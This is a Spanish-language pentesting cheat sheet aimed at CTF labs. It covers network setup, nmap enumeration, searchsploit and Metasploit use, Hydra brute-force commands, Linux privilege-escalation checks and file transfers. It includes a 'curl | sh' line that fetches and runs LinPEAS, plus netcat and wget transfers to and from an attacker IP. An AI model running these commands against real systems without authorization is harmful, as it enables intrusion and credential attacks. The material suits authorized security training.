# üìñ BIBLIA DE PENTESTING 2.0 - GU√çA MEJORADA
*Metodolog√≠a Acad√©mica MIT - Ciberseguridad Avanzada*

---

## üéØ METODOLOG√çA FUNDAMENTAL DE PENTESTING

### Principios Acad√©micos Base
El pentesting profesional sigue una metodolog√≠a estructurada y repetible, basada en frameworks reconocidos como OWASP, NIST y PTES. Esta gu√≠a integra teor√≠a acad√©mica con pr√°ctica profesional de nivel √©lite.

**Marco Conceptual**: RECONOCIMIENTO ‚Üí ENUMERACI√ìN ‚Üí EXPLOTACI√ìN ‚Üí POST-EXPLOTACI√ìN ‚Üí DEFENSA

---

## üîç FASE 1: RECONOCIMIENTO INICIAL

### 1.0 Preparaci√≥n del Entorno de Herramientas

#### Instalaci√≥n de Suite de Pentesting
```bash
# Instala las herramientas m√°s comunes para pentesting en sistemas basados en Debian/Ubuntu
sudo apt update && sudo apt install -y nmap sqlmap burpsuite dirb whois dnsutils net-tools nikto metasploit-framework arp-scan ftp hydra john hashcat netcat-traditional zmap gobuster enum4linux smbclient seclists neofetch htop openssh-server git-dumper dirbuster wfuzz curl cloudflared
```

### 1.1 Preparaci√≥n del Entorno de Laboratorio y Conectividad

#### **Configuraci√≥n de Red en VirtualBox para Laboratorios CTF**

La correcta configuraci√≥n de la red es crucial. Cada modo tiene un prop√≥sito espec√≠fico.

| Modo de Red | Acceso a Internet | Acceso a Red Local (LAN) | Comunicaci√≥n Host ‚Üî VM | Comunicaci√≥n VM ‚Üî VM | Caso de Uso Principal |
| :--- | :---: | :---: | :---: | :---: | :--- |
| **NAT** | ‚úÖ | ‚ùå | ‚ö†Ô∏è (Con Port Forwarding) | ‚ùå | **Uso B√°sico:** La VM necesita internet pero debe estar aislada de la LAN. |
| **Red NAT** | ‚úÖ | ‚ùå | ‚úÖ | ‚úÖ | **Laboratorio Aislado con Internet:** Crea una sub-red interna para tus VMs, todas con salida a internet. |
| **Adaptador Puente** | ‚úÖ | ‚úÖ | ‚úÖ | ‚úÖ | **Simulaci√≥n Real:** La VM es un dispositivo m√°s en tu red f√≠sica. **CUIDADO:** Expone la VM a la red. |
| **Red Interna** | ‚ùå | ‚ùå | ‚ùå | ‚úÖ | **M√°ximo Aislamiento:** Para analizar malware o practicar ataques en un entorno 100% controlado sin conexi√≥n externa. |
| **Adaptador Solo-Anfitri√≥n** | ‚ùå | ‚ùå | ‚úÖ | ‚úÖ | **‚≠ê CTF / Laboratorio Ideal:** Crea una red privada entre el anfitri√≥n y las VMs. Sin salida a internet, ideal para practicar de forma segura. |

**Nota sobre DHCP:** En los modos **Adaptador Puente** y **Solo-Anfitri√≥n**, puedes necesitar asignar una IP est√°tica. Si la VM no obtiene una IP, es posible que debas configurar la red manualmente en el sistema operativo de la VM, desactivando el cliente DHCP si es necesario.

#### **Conexi√≥n SSH a la M√°quina Objetivo (CTF)**
Una vez que identificas la IP de la m√°quina v√≠ctima y confirmas que el puerto 22 est√° abierto, el siguiente paso suele ser intentar una conexi√≥n SSH.

sudo systemctl enable ssh --now # habilitar ssh permanente
sudo systemctl start ssh # habilitar ssh temporal
sudo systemctl stop ssh
free -h

| Tarea | ‚≠ê Comando Esencial | Opciones Comunes |
| :--- | :--- | :--- |
| **Conexi√≥n B√°sica** | `ssh usuario@<IP_OBJETIVO>` | |
| **Especificar Puerto** | `ssh -p <PUERTO> usuario@<IP_OBJETIVO>` | `-p`: Si SSH no corre en el puerto est√°ndar 22. |
| **Usar Llave Privada** | `ssh -i /ruta/a/llave.pem usuario@<IP_OBJETIVO>` | `-i`: Para autenticaci√≥n con llaves en lugar de contrase√±a. |


#### Configuraci√≥n Manual de Red (Entorno de Laboratorio Local)

| Tarea | ‚≠ê Comando Esencial (Linux) | Comando Alternativo (Linux) | Comando Windows |
| :--- | :--- | :--- | :--- |
| Ver Nombres de Interfaz | `ip a` | `ifconfig` | `ipconfig /all` |
| Asignar IP Temporal | `sudo ip addr add <IP>/<CIDR> dev <interfaz>` | `sudo ifconfig <interfaz> <IP> netmask <M√°scara>` | `netsh interface ip set address name="<Interfaz>" static <IP> <M√°scara> <Gateway>` |
| Asignar IP Permanente | `sudo nano /etc/netplan/[archivo].yaml` (Ubuntu) | `sudo nano /etc/network/interfaces` (Debian) | Panel de Control ‚Üí Red |
| Aplicar Cambios Netplan | `sudo netplan apply` | - | - |

#### Tabla de Flags - Configuraci√≥n de Red

| Flag/Par√°metro | Comando      | Funci√≥n Acad√©mica                              | Fundamento T√©cnico                                |
|----------------|--------------|------------------------------------------------|---------------------------------------------------|
| `/all`         | ipconfig     | Informaci√≥n completa de todas las interfaces   | Incluye DNS, DHCP lease, MAC addresses           |
| `[IP]/[CIDR]`  | ip addr add  | Notaci√≥n CIDR para red y m√°scara               | /24 = 255.255.255.0, /16 = 255.255.0.0           |
| `dev`          | ip addr add  | Especifica dispositivo de red                  | Indica interfaz f√≠sica o virtual espec√≠fica      |
| `netmask`      | ifconfig     | M√°scara de subred en formato decimal punteado | Define porci√≥n de red vs host en direcci√≥n IP    |
| `static`       | netplan      | Configuraci√≥n est√°tica vs DHCP                | Direcci√≥n fija no asignada din√°micamente          |

#### Verificaci√≥n de Conectividad Objetivo

| Tarea                        | Linux / macOS              | Windows             | Funci√≥n y Desglose de Opciones                              |
|------------------------------|----------------------------|---------------------|--------------------------------------------------------------|
| Verificar si una IP responde | `ping [IP]`                | `ping [IP]`         | `-c [num]` (Linux), `-t` (Win), `-n [num]` (Win espec√≠fico) |
| Trazar ruta a un destino     | `traceroute [IP]`          | `tracert [IP]`      | `-n` (Linux), `-d` (Windows) - no resolver nombres         |
| Ver tabla de vecinos         | `ip n` / `arp -a`          | `arp -a`            | Muestra tabla ARP con MAC addresses                         |

#### Tabla de Flags - Conectividad

| Flag     | Comando     | Funci√≥n Acad√©mica                               | Fundamento T√©cnico                                  |
|----------|-------------|-------------------------------------------------|-----------------------------------------------------|
| `-c`     | ping        | Count - n√∫mero de paquetes ICMP a enviar       | Evita ping infinito en Linux                       |
| `-t`     | ping (Win)  | Till stopped - env√≠a hasta interrupci√≥n manual | Equivalente a ping sin par√°metros en Linux         |
| `-n`     | ping (Win)  | Number - cantidad espec√≠fica de paquetes       | Equivalente a `-c` en Linux/macOS                   |
| `-n`     | traceroute  | Numeric - muestra IPs sin resolver nombres     | Optimizaci√≥n de velocidad y precisi√≥n               |
| `-d`     | tracert     | No resolve - no resuelve direcciones a nombres | Equivalente a `-n` en Linux/macOS                   |

#### Reconocimiento Pasivo Inicial

| Tarea                        | Comando                    | Funci√≥n y Aplicaci√≥n Pr√°ctica                           |
|------------------------------|----------------------------|----------------------------------------------------------|
| Consultar info dominio       | `whois [dominio]`          | Informaci√≥n OSINT sin interacci√≥n directa               |
| Consultar DNS                | `nslookup` / `dig`         | Mapear infraestructura DNS y servicios asociados        |
| Consultas DNS espec√≠ficas    | `dig [dominio] MX`         | Servidores de correo                                     |
| Consultas DNS TXT            | `dig [dominio] TXT`        | Registros de texto (SPF, DKIM, verificaci√≥n)            |

#### Tabla de Flags - Reconocimiento DNS

| Flag/Par√°metro | Comando    | Funci√≥n Acad√©mica                               | Informaci√≥n Obtenida                                |
|----------------|------------|-------------------------------------------------|-----------------------------------------------------|
| `MX`           | dig        | Mail Exchange records                           | Servidores de correo del dominio                   |
| `TXT`          | dig        | Text records                                    | Pol√≠ticas SPF, DKIM, verificaciones de dominio     |
| `NS`           | dig        | Name Server records                             | Servidores DNS autoritativos                       |
| `A`            | dig        | Address records (por defecto)                   | Resoluci√≥n dominio a IPv4                          |
| `AAAA`         | dig        | IPv6 address records                            | Resoluci√≥n dominio a IPv6                          |
| `-x`           | dig        | Reverse DNS lookup                              | Resoluci√≥n IP a dominio                             |

### 1.2 Descubrimiento de Red y Hosts Activos

#### Escaneo de Descubrimiento de Hosts (Ping Scan)

| T√©cnica | ‚≠ê Comando Esencial | Funci√≥n y Aplicaci√≥n Pr√°ctica |
| :--- | :--- | :--- |
| **Descubrimiento B√°sico** | `sudo nmap -sn <rango_red>` | **El primer paso siempre.** Identifica qu√© hosts est√°n activos en la red sin escanear puertos. |
| Descubrimiento ARP (Local) | `sudo arp-scan -l` | Muy r√°pido y efectivo en redes locales (LAN). No funciona fuera de tu subred. |
| Descubrimiento TCP SYN | `sudo nmap -PS22,80,443 <rango_red>` | √ötil para evadir firewalls que bloquean pings (ICMP), usando puertos comunes. |

---

## üîç FASE 2: ENUMERACI√ìN DE SERVICIOS

### 2.1 Escaneo Completo de Puertos

#### Metodolog√≠a de Escaneo en Dos Fases (Eficiencia y Profundidad)

| Fase | ‚≠ê Comando Esencial | Prop√≥sito Acad√©mico |
| :--- | :--- | :--- |
| **Fase 1: R√°pida** | `nmap -p- --open -sS --min-rate 5000 -n -Pn <IP> -oG allPorts` | Descubre **TODOS** los puertos abiertos lo m√°s r√°pido posible. |
| **Fase 2: Detallada** | `nmap -p <puertos> -sC -sV <IP> -oN targeted` | Analiza en profundidad los servicios, versiones y scripts en los puertos encontrados. |

#### **Comando Consolidado (El m√°s com√∫n en CTFs)**
Este comando es un balance entre velocidad y detalle, ideal para la mayor√≠a de escenarios.
```bash
# ‚≠ê Escaneo de puertos, versiones, y scripts por defecto. El m√°s utilizado.
nmap -sC -sV -p- <IP> -oN scan_completo
```

#### Tabla de Flags - Nmap (Los m√°s importantes)

| Flag | Funci√≥n Acad√©mica | Fundamento T√©cnico |
| :--- | :--- | :--- |
| **-sV** | **Version detection** | **‚≠ê Esencial para saber qu√© software y versi√≥n corre en un puerto.** |
| **-sC** | **Script scan** | **‚≠ê Esencial para lanzar scripts b√°sicos de enumeraci√≥n y detecci√≥n.** |
| **-p-** | Escanear todos los 65,535 puertos | Cobertura completa. |
| **-p <puertos>**| Escanear puertos espec√≠ficos | Para el escaneo de Fase 2, ej: `-p 21,22,80`. |
| **--open** | Filtrar solo puertos en estado OPEN | Elimina ruido de puertos `closed/filtered`. |
| **-sS** | SYN Scan (TCP Half-Open) | Sigiloso y eficiente, no completa el handshake TCP. |
| **-n** | Deshabilitar resoluci√≥n DNS | Optimizaci√≥n de velocidad. |
| **-Pn** | Omitir descubrimiento de host | Asume que el host est√° activo, √∫til si el ping est√° bloqueado. |
| **-oN / -oG** | Output Normal / Grepeable | `-oN` para lectura humana, `-oG` para procesar con otras herramientas. |

#### Procesamiento Automatizado de Resultados (Ejemplo)
```bash
# Extrae los puertos abiertos del archivo grepeable y los formatea para el siguiente comando
cat allPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ','
```

### 2.2 Enumeraci√≥n Espec√≠fica por Protocolo

#### HTTP/HTTPS (Puertos 80, 443)

| T√©cnica | ‚≠ê Comando Esencial | Prop√≥sito Acad√©mico |
| :--- | :--- | :--- |
| **An√°lisis de Vulnerabilidades** | `nikto -h http://<IP>` | Identificaci√≥n automatizada de vulnerabilidades web comunes. |
| Banner Grabbing | `curl -I http://<IP>` | Obtener cabeceras HTTP para identificar servidor y tecnolog√≠a. |
| Fuzzing de Directorios | `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` | Descubrir directorios y archivos ocultos. |

#### SMB/NetBIOS (Puertos 139, 445)

| T√©cnica | ‚≠ê Comando Esencial | Prop√≥sito Acad√©mico |
| :--- | :--- | :--- |
| **Listado de Recursos** | `smbclient -L //<IP_objetivo> -N` | **El primer paso en SMB.** Enumera los recursos compartidos (shares) sin necesidad de contrase√±a. |
| Enumeraci√≥n Completa | `enum4linux -a <IP_objetivo>` | Extracci√≥n completa de informaci√≥n (usuarios, shares, pol√≠ticas). Muy ruidoso. |
| Scripts NSE SMB | `nmap -p 445 --script smb-enum-shares,smb-vuln* <IP>` | Detecci√≥n automatizada de vulnerabilidades y enumeraci√≥n con Nmap. |

#### FTP (Puerto 21)

| T√©cnica | ‚≠ê Comando Esencial | Prop√≥sito Acad√©mico |
| :--- | :--- | :--- |
| **Acceso An√≥nimo** | `ftp <IP_objetivo>` (user: `anonymous`, pass: `anonymous`) | **Verificar siempre.** Una de las misconfigurations m√°s comunes. |
| Enumeraci√≥n Automatizada | `nmap -p 21 --script ftp-anon,ftp-vuln* <IP>` | Scripts de Nmap para detectar acceso an√≥nimo y vulnerabilidades conocidas. |

---

## ‚öîÔ∏è FASE 3: EXPLOTACI√ìN

### 3.1 B√∫squeda y An√°lisis de Vulnerabilidades

#### B√∫squeda con Searchsploit (Base de Datos Local de Exploits)

| T√©cnica | ‚≠ê Comando Esencial | Prop√≥sito Acad√©mico |
| :--- | :--- | :--- |
| **B√∫squeda por Servicio** | `searchsploit <servicio> <versi√≥n>` | **El m√©todo m√°s r√°pido.** Correlaciona la versi√≥n del software con exploits conocidos en la base de datos de Exploit-DB. |
| Copiar Exploit | `searchsploit -m <ID_exploit>` | Copia el c√≥digo del exploit a tu directorio actual para an√°lisis y ejecuci√≥n. |

#### Framework Metasploit

| Fase | ‚≠ê Comando Esencial | Prop√≥sito Acad√©mico |
| :--- | :--- | :--- |
| **B√∫squeda de M√≥dulos** | `search <criterio>` | Localizaci√≥n precisa de m√≥dulos de exploits o auxiliares. |
| **Selecci√≥n de Exploit** | `use exploit/<ruta>` | Carga un m√≥dulo espec√≠fico para su configuraci√≥n. |
| **Configuraci√≥n** | `set RHOSTS <IP>` / `set LHOST <IP>` | `RHOSTS` es la IP v√≠ctima. `LHOST` es tu IP para reverse shells. |
| **Ejecuci√≥n** | `exploit` o `run` | Lanza el exploit contra el objetivo. |

### 3.2 Ataques de Fuerza Bruta con Hydra

| Protocolo | ‚≠ê Comando Esencial | Prop√≥sito Acad√©mico |
| :--- | :--- | :--- |
| **SSH** | `hydra -L users.txt -P pass.txt ssh://<IP>` | Ataque de diccionario contra el servicio SSH. |
| **FTP** | `hydra -L users.txt -P pass.txt ftp://<IP>` | Ataque de diccionario contra el servicio FTP. |
| **Formulario Web (POST)** | `hydra -L users.txt -P pass.txt <IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Incorrect"` | Ataque contra un formulario de login web. |

---

## üöÄ FASE 4: POST-EXPLOTACI√ìN

### 4.1 Reconocimiento Post-Explotaci√≥n (Enumeraci√≥n Interna)

| T√©cnica | ‚≠ê Comando Esencial | Prop√≥sito Acad√©mico |
| :--- | :--- | :--- |
| **Verificaci√≥n de Identidad** | `whoami && id` | **Lo primero siempre.** Confirma con qu√© usuario y con qu√© privilegios est√°s en el sistema. |
| **Informaci√≥n del Sistema** | `uname -a` | Fingerprinting completo del sistema operativo y kernel. |
| **Procesos Activos** | `ps aux` | An√°lisis de todos los procesos en ejecuci√≥n, sus due√±os y posibles servicios interesantes. |
| **Conexiones de Red** | `ss -tuln` o `netstat -tuln` | Mapear las comunicaciones y servicios que corren localmente en la m√°quina comprometida. |

### 4.2 Escalaci√≥n de Privilegios

| T√©cnica | ‚≠ê Comando Esencial | Prop√≥sito Acad√©mico |
| :--- | :--- | :--- |
| **Permisos Sudo** | `sudo -l` | **La v√≠a m√°s com√∫n.** Revisa si tu usuario puede ejecutar comandos como root. |
| **Binarios SUID** | `find / -perm -u=s -type f 2>/dev/null` | Localiza binarios que se ejecutan con los permisos del due√±o (potencialmente root). |
| **Tareas Programadas (Cron)** | `cat /etc/crontab` | Revisa si hay tareas programadas que puedas modificar o que se ejecuten con privilegios elevados. |
| **Vulnerabilidades del Kernel** | `uname -r` (y luego `searchsploit`) | Busca exploits espec√≠ficos para la versi√≥n del kernel del sistema. Es una opci√≥n m√°s ruidosa y riesgosa. |
| **Scripts Automatizados** | `curl -L <URL_linpeas.sh> | sh` | LinPEAS/LinEnum son scripts que automatizan la b√∫squeda de todos estos vectores. |

---

## üåê FASE 5: METODOLOG√çA DE TRANSFERENCIA DE ARCHIVOS

### 5.1 Transferencia desde Atacante hacia Objetivo

| M√©todo | ‚≠ê Comando Esencial (Atacante) | Comando Objetivo |
| :--- | :--- | :--- |
| **Servidor HTTP Python** | `python3 -m http.server 80` | `wget http://<IP_atacante>/<archivo>` o `curl -O ...` |
| **Netcat** | `nc -lvnp 1234 < <archivo>` | `nc <IP_atacante> 1234 > <archivo>` |
| **SCP (SSH)** | `scp <archivo> usuario@<IP_objetivo>:/tmp/` | (No se necesita comando en objetivo) |

---
*Esta gu√≠a ha sido actualizada para mantener el contenido detallado del original, destacando los comandos m√°s comunes y a√±adiendo las secciones solicitadas para una experiencia de aprendizaje m√°s completa.*
